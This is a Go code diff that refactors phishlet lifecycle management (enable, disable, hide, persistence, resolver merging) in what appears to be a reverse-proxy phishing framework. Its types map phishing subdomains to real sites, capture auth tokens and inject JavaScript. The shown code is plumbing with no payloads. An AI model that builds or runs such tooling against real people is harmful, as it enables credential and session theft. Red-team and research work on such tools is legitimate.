@@ -4,23 +4,34 @@ import (
 	"fmt"
 	"regexp"
 	"strings"
-	"sync"
 )
 
 // PhishletStore is the persistence interface required by PhishletService.
+// It persists only operator config fields; compiled rule fields are never stored.
 type PhishletStore interface {
-	GetPhishletDeployment(name string) (*PhishletDeployment, error)
-	SetPhishletDeployment(deployment *PhishletDeployment) error
-	ListPhishletDeployments() ([]*PhishletDeployment, error)
-	DeletePhishletDeployment(name string) error
+	GetPhishlet(name string) (*Phishlet, error)
+	SetPhishlet(p *Phishlet) error
+	ListPhishlets() ([]*Phishlet, error)
+	DeletePhishlet(name string) error
 }
 
-// PhishletDef is the compiled, fully-resolved form of a phishlet YAML file.
-// All regex fields are pre-compiled.
-type PhishletDef struct {
-	Name        string
-	Author      string
-	Version     string
+// Phishlet is the unified type representing a phishlet — combining the compiled
+// rules from its YAML file with the operator's runtime configuration.
+//
+// The compiled rule fields (ProxyHosts, SubFilters, etc.) are populated by the
+// phishlet loader and are never persisted. The operator config fields (Hostname,
+// BaseDomain, etc.) are persisted to the database and survive restarts.
+//
+// Either group of fields may be zero-valued: a freshly loaded YAML has no
+// operator config; a record loaded from the database has no compiled rules.
+// The daemon merges both at startup and on reload.
+type Phishlet struct {
+	// Identity (from YAML)
+	Name    string
+	Author  string
+	Version string
+
+	// Compiled rules (from YAML — in-memory only, never persisted)
 	ProxyHosts  []ProxyHost
 	SubFilters  []SubFilter
 	AuthTokens  []TokenRule
@@ -30,9 +41,32 @@ type PhishletDef struct {
 	Intercepts  []InterceptRule
 	JSInjects   []JSInject
 	AuthURLs    []*regexp.Regexp
+
+	// Operator config (persisted to SQLite)
+	BaseDomain  string
+	DNSProvider string
+	Hostname    string
+	UnauthURL   string
+	SpoofURL    string
+	Enabled     bool
+	Hidden      bool
 }
 
-func (p *PhishletDef) MatchesHost(hostname, baseDomain string) bool {
+// applyOperatorConfig copies all operator-config fields from src into p.
+// This is the single place that lists which fields are persisted, so adding a
+// new operator field only requires updating this method.
+func (p *Phishlet) applyOperatorConfig(src *Phishlet) {
+	p.BaseDomain = src.BaseDomain
+	p.DNSProvider = src.DNSProvider
+	p.Hostname = src.Hostname
+	p.UnauthURL = src.UnauthURL
+	p.SpoofURL = src.SpoofURL
+	p.Enabled = src.Enabled
+	p.Hidden = src.Hidden
+}
+
+// MatchesHost reports whether hostname belongs to this phishlet under baseDomain.
+func (p *Phishlet) MatchesHost(hostname, baseDomain string) bool {
 	for _, host := range p.ProxyHosts {
 		if hostname == host.PhishSubdomain+"."+baseDomain {
 			return true
@@ -41,7 +75,8 @@ func (p *PhishletDef) MatchesHost(hostname, baseDomain string) bool {
 	return false
 }
 
-func (p *PhishletDef) FindLanding() *ProxyHost {
+// FindLanding returns the proxy host marked is_landing, or nil if none.
+func (p *Phishlet) FindLanding() *ProxyHost {
 	for i := range p.ProxyHosts {
 		if p.ProxyHosts[i].IsLanding {
 			return &p.ProxyHosts[i]
@@ -50,28 +85,14 @@ func (p *PhishletDef) FindLanding() *ProxyHost {
 	return nil
 }
 
-func (p *PhishletDef) MatchesAuthURL(rawURL string) bool {
+// MatchesAuthURL reports whether rawURL matches any of the phishlet's auth URL patterns.
+func (p *Phishlet) MatchesAuthURL(rawURL string) bool {
 	for _, authURL := range p.AuthURLs {
 		if authURL.MatchString(rawURL) {
 			return true
 		}
 	}
 	return false
-}
-
-// PhishletDeployment is the operator's runtime state for a phishlet stored in
-// the database: the hostname it answers on, whether it is enabled/hidden, and
-// which DNS provider manages its records. Separate from PhishletDef (the static
-// YAML definition).
-type PhishletDeployment struct {
-	Name        string
-	BaseDomain  string
-	DNSProvider string
-	Hostname    string
-	UnauthURL   string
-	SpoofURL    string
-	Enabled     bool
-	Hidden      bool
 }
 
 // ProxyHost maps a phishing subdomain to a real upstream host.
@@ -182,30 +203,38 @@ type JSInject struct {
 
 // PhishletService owns all business logic for phishlet lifecycle.
 // It is the single point of truth for which phishlets are active: every
-// enable/disable writes to the store AND updates the in-memory hostname set,
+// enable/disable writes to the store AND updates the in-memory resolver,
 // so the proxy router never falls out of sync with the database.
 type PhishletService struct {
-	store           PhishletStore
-	bus             EventBus
-	dns             *DNSService
-	activeHostnames sync.Map // hostname (lowercase) → struct{}
+	store    PhishletStore
+	bus      EventBus
+	dns      *DNSService
+	resolver *PhishletResolver
 }
 
-func NewPhishletService(store PhishletStore, bus EventBus, dns *DNSService) *PhishletService {
-	return &PhishletService{store: store, bus: bus, dns: dns}
+func NewPhishletService(store PhishletStore, bus EventBus, dns *DNSService, resolver *PhishletResolver) *PhishletService {
+	return &PhishletService{store: store, bus: bus, dns: dns, resolver: resolver}
 }
 
-// LoadActiveFromDB populates the in-memory hostname set from the database.
-// Call once during startup, before the proxy begins accepting connections.
+// LoadActiveFromDB merges stored operator configs from the database into any
+// phishlets already registered in the resolver. Call once during startup,
+// after YAML files have been loaded, before the proxy begins accepting connections.
 func (s *PhishletService) LoadActiveFromDB() error {
-	deployments, err := s.store.ListPhishletDeployments()
+	stored, err := s.store.ListPhishlets()
 	if err != nil {
-		return fmt.Errorf("loading active phishlets: %w", err)
+		return fmt.Errorf("loading phishlets: %w", err)
 	}
-	for _, deployment := range deployments {
-		if deployment.Enabled && deployment.Hostname != "" {
-			s.activeHostnames.Store(strings.ToLower(deployment.Hostname), struct{}{})
+	for _, storedPhishlet := range stored {
+		p := s.resolver.Get(storedPhishlet.Name)
+		if p == nil {
+			// YAML not loaded yet — register config-only so the operator can still
+			// query and modify it via the API.
+			s.resolver.Register(storedPhishlet)
+			continue
 		}
+		merged := *p
+		merged.applyOperatorConfig(storedPhishlet)
+		s.resolver.Register(&merged)
 	}
 	return nil
 }
@@ -213,87 +242,110 @@ func (s *PhishletService) LoadActiveFromDB() error {
 // Contains reports whether hostname is currently proxied by an active phishlet.
 // Satisfies proxy.HostnameSet so PhishletService can be passed directly to PhishletRouter.
 func (s *PhishletService) Contains(hostname string) bool {
-	_, ok := s.activeHostnames.Load(strings.ToLower(hostname))
-	return ok
+	return s.resolver.ContainsHostname(hostname)
 }
 
 // Enable marks a phishlet as active, optionally updating its hostname, base
-// domain, and DNS provider. The in-memory hostname set is updated atomically
-// so routing takes effect immediately without a restart.
-func (s *PhishletService) Enable(name, hostname, baseDomain, dnsProvider string) (*PhishletDeployment, error) {
-	deployment, err := s.store.GetPhishletDeployment(name)
-	if err != nil {
-		deployment = &PhishletDeployment{Name: name}
-	}
+// domain, and DNS provider. The resolver is updated atomically so routing
+// takes effect immediately without a restart.
+func (s *PhishletService) Enable(name, hostname, baseDomain, dnsProvider string) (*Phishlet, error) {
+	p := s.currentOrNew(name)
 	if hostname != "" {
-		deployment.Hostname = hostname
+		p.Hostname = hostname
 	}
 	if baseDomain != "" {
-		deployment.BaseDomain = baseDomain
+		p.BaseDomain = baseDomain
 	}
 	if dnsProvider != "" {
-		deployment.DNSProvider = dnsProvider
+		p.DNSProvider = dnsProvider
 	}
-	if deployment.Hostname == "" {
-		return nil, fmt.Errorf("hostname: required")
+	if p.Hostname == "" {
+		return nil, ErrHostnameRequired
 	}
-	deployment.Enabled = true
-	if err := s.store.SetPhishletDeployment(deployment); err != nil {
+	p.Enabled = true
+	if err := s.store.SetPhishlet(p); err != nil {
 		return nil, err
 	}
-	s.activeHostnames.Store(strings.ToLower(deployment.Hostname), struct{}{})
-	return deployment, nil
+	s.resolver.Register(p)
+	return p, nil
 }
 
-// Disable marks a phishlet as inactive and removes it from the hostname set.
-func (s *PhishletService) Disable(name string) (*PhishletDeployment, error) {
-	deployment, err := s.store.GetPhishletDeployment(name)
+// Disable marks a phishlet as inactive.
+func (s *PhishletService) Disable(name string) (*Phishlet, error) {
+	p, err := s.currentOrErr(name)
 	if err != nil {
 		return nil, err
 	}
-	deployment.Enabled = false
-	if err := s.store.SetPhishletDeployment(deployment); err != nil {
+	p.Enabled = false
+	if err := s.store.SetPhishlet(p); err != nil {
 		return nil, err
 	}
-	if deployment.Hostname != "" {
-		s.activeHostnames.Delete(strings.ToLower(deployment.Hostname))
-	}
-	return deployment, nil
+	s.resolver.Register(p)
+	return p, nil
 }
 
 // Hide marks a phishlet as hidden (suppressed from lure URL generation).
 // Does not affect routing — the phishlet keeps intercepting traffic.
-func (s *PhishletService) Hide(name string) (*PhishletDeployment, error) {
-	deployment, err := s.store.GetPhishletDeployment(name)
+func (s *PhishletService) Hide(name string) (*Phishlet, error) {
+	p, err := s.currentOrErr(name)
 	if err != nil {
 		return nil, err
 	}
-	deployment.Hidden = true
-	if err := s.store.SetPhishletDeployment(deployment); err != nil {
+	p.Hidden = true
+	if err := s.store.SetPhishlet(p); err != nil {
 		return nil, err
 	}
-	return deployment, nil
+	s.resolver.Register(p)
+	return p, nil
 }
 
 // Unhide reverses Hide.
-func (s *PhishletService) Unhide(name string) (*PhishletDeployment, error) {
-	deployment, err := s.store.GetPhishletDeployment(name)
+func (s *PhishletService) Unhide(name string) (*Phishlet, error) {
+	p, err := s.currentOrErr(name)
 	if err != nil {
 		return nil, err
 	}
-	deployment.Hidden = false
-	if err := s.store.SetPhishletDeployment(deployment); err != nil {
+	p.Hidden = false
+	if err := s.store.SetPhishlet(p); err != nil {
 		return nil, err
 	}
-	return deployment, nil
+	s.resolver.Register(p)
+	return p, nil
 }
 
-// GetDeployment returns the stored deployment for a phishlet by name.
-func (s *PhishletService) GetDeployment(name string) (*PhishletDeployment, error) {
-	return s.store.GetPhishletDeployment(name)
+// Get returns the phishlet by name, preferring the resolver's in-memory
+// copy (which has compiled rules) over the store.
+func (s *PhishletService) Get(name string) (*Phishlet, error) {
+	if p := s.resolver.Get(name); p != nil {
+		return p, nil
+	}
+	return s.store.GetPhishlet(name)
 }
 
-// ListDeployments returns all stored phishlet deployments.
-func (s *PhishletService) ListDeployments() ([]*PhishletDeployment, error) {
-	return s.store.ListPhishletDeployments()
+// List returns all stored phishlet operator configs.
+func (s *PhishletService) List() ([]*Phishlet, error) {
+	return s.store.ListPhishlets()
+}
+
+// currentOrNew returns a copy of the registered phishlet (if any), otherwise
+// a shell loaded from the store or newly created.
+func (s *PhishletService) currentOrNew(name string) *Phishlet {
+	if p := s.resolver.Get(name); p != nil {
+		copy := *p
+		return &copy
+	}
+	stored, err := s.store.GetPhishlet(name)
+	if err != nil {
+		return &Phishlet{Name: name}
+	}
+	return stored
+}
+
+// currentOrErr returns a copy of the current phishlet state or an error if not found anywhere.
+func (s *PhishletService) currentOrErr(name string) (*Phishlet, error) {
+	if p := s.resolver.Get(name); p != nil {
+		copy := *p
+		return &copy, nil
+	}
+	return s.store.GetPhishlet(name)
 }
